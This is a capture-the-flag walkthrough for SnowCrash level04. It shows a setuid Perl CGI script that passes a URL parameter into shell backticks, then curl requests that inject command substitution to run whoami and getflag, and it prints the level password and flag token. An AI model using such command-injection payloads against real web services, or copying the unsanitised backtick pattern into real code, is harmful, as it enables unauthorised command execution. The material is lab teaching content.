## level04
```
level03@SnowCrash:~$ su level04 
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```
```
level04@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
`level04.pl` this is Perl script in home directory.
```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
The script indicates that it is something running on `localhost:4747`. Verbose port scan for listening daemons, without sending any data to them.  
`nc -zv` allows to check connection to 4747 without sending any data and verbose mode
```
level04@SnowCrash:~$ nc -zv localhost 4747
Connection to localhost 4747 port [tcp/*] succeeded!
```
Script expects a value passed in `x` parameter which is passed to `x()` function. Then, while printing it, backticks are used to evaluate argument by echoing it.  
So trying to pass `whoami` command substitution reveals that is evaluated and executed as `flag04`
```
level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
flag04
```
All that remains to be done is to execute `getflag` binary.
```
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
